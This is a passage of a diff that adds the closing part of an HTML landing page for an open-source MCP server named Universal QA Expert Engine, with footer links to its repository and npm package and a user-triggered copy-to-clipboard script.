+         class="inline-flex items-center justify-center gap-2 rounded-lg border border-edgeSoft px-5 py-3 font-semibold transition-colors hover:border-muted hover:bg-surface">
+        <i class="fa-brands fa-github" aria-hidden="true"></i>Read the source
+      </a>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<!-- ───────────────────────── footer ───────────────────────── -->
+<footer class="mx-auto max-w-6xl px-5 py-12">
+  <div class="flex flex-col gap-8 sm:flex-row sm:items-start sm:justify-between">
+    <div>
+      <div class="flex items-center gap-2.5 font-semibold tracking-tight">
+        <span class="grid h-7 w-7 place-items-center rounded bg-accept/15 text-accept" aria-hidden="true"><i class="fa-solid fa-vial-circle-check text-[13px]"></i></span>
+        Universal QA Expert Engine
+      </div>
+      <p class="mt-3 max-w-sm text-[14px] leading-relaxed text-muted">
+        An open-source MCP server that gives AI coding agents a senior QA engineer&rsquo;s
+        methodology, and a guarded way to run it.
+      </p>
+    </div>
+
+    <nav class="grid grid-cols-2 gap-x-12 gap-y-2.5 text-[14px]" aria-label="Footer">
+      <a class="text-muted transition-colors hover:text-ink" href="https://github.com/code-by-nanthu/mcp-qa-expert-engine">Repository</a>
+      <a class="text-muted transition-colors hover:text-ink" href="https://www.npmjs.com/package/mcp-qa-expert-engine">npm package</a>
+      <a class="text-muted transition-colors hover:text-ink" href="https://github.com/code-by-nanthu/mcp-qa-expert-engine/issues">Report an issue</a>
+      <a class="text-muted transition-colors hover:text-ink" href="https://github.com/code-by-nanthu/mcp-qa-expert-engine#readme">Documentation</a>
+      <a class="text-muted transition-colors hover:text-ink" href="https://github.com/code-by-nanthu/mcp-qa-expert-engine/blob/main/LICENSE">MIT licence</a>
+      <a class="text-muted transition-colors hover:text-ink" href="https://modelcontextprotocol.io">About MCP</a>
+    </nav>
+  </div>
+
+  <div class="mt-10 flex flex-col gap-2 border-t border-edge pt-6 text-[13px] text-faint sm:flex-row sm:items-center sm:justify-between">
+    <p>Released under the MIT licence.</p>
+    <p class="font-mono">mcp-qa-expert-engine@1.1.0</p>
+  </div>
+</footer>
+
+<script>
+  // Copy-to-clipboard: user-triggered, with a visible confirmation.
+  document.querySelectorAll('[data-copy]').forEach(function (btn) {
+    btn.addEventListener('click', async function () {
+      var target = document.querySelector(btn.getAttribute('data-copy'));
+      if (!target) return;
+      var text = target.innerText.trim();
+      try {
+        await navigator.clipboard.writeText(text);
+      } catch (err) {
+        var ta = document.createElement('textarea');
+        ta.value = text;
+        ta.setAttribute('readonly', '');
+        ta.style.position = 'fixed';
+        ta.style.opacity = '0';
+        document.body.appendChild(ta);
+        ta.select();
+        try { document.execCommand('copy'); } catch (e) { /* clipboard unavailable */ }
+        document.body.removeChild(ta);
+      }
+      var icon = btn.querySelector('i');
+      var label = btn.querySelector('span');
+      var prevIcon = icon ? icon.className : null;
+      var prevLabel = label ? label.textContent : null;
+      if (icon) icon.className = 'fa-solid fa-check';
+      if (label) label.textContent = 'Copied';
+      btn.classList.add('text-accept');
+      setTimeout(function () {
+        if (icon && prevIcon) icon.className = prevIcon;
+        if (label && prevLabel) label.textContent = prevLabel;
+        btn.classList.remove('text-accept');
+      }, 1600);
+    });
+  });
+</script>
+
+</body>
+</html>
